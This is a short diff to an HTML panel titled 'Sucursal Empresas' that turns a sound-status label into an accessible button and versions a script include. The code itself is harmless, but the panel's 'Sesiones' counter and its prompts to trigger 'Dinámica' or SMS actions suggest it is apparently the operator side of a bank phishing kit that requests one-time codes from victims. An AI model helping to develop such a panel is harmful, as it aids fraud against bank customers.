@@ -14,7 +14,9 @@
     <header class="toolbar">
       <div class="toolbar__left">
         <h1 class="toolbar__title">Sucursal Empresas</h1>
-        <span class="toolbar__meta">Sesiones: <strong id="rowCount">0</strong> · usa Dinámica o SMS en Acciones <span id="audioStatus" style="cursor: pointer; margin-left: 8px; font-weight: bold; color: #4caf50; border: 1px solid #4caf50; padding: 2px 6px; border-radius: 4px; display: inline-block; background: #e8f5e9; font-size: 0.75rem; user-select: none;" title="Activar/Desactivar Sonido">🔊 Sonido: ON</span></span>
+        <span class="toolbar__meta">Sesiones: <strong id="rowCount">0</strong> · usa Dinámica o SMS en Acciones
+          <button type="button" class="sound-toggle" id="audioStatus" aria-pressed="true" title="Activar o desactivar sonido">🔊 Sonido: ON</button>
+        </span>
       </div>
       <div class="toolbar__actions">
         <button type="button" class="btn btn--ok" id="btnClean">Limpiar</button>
@@ -159,6 +161,6 @@
     </p>
   </main>
 
-  <script src="js/panel.js"></script>
+  <script src="js/panel.js?v=sound-toggle"></script>
 </body>
 </html>
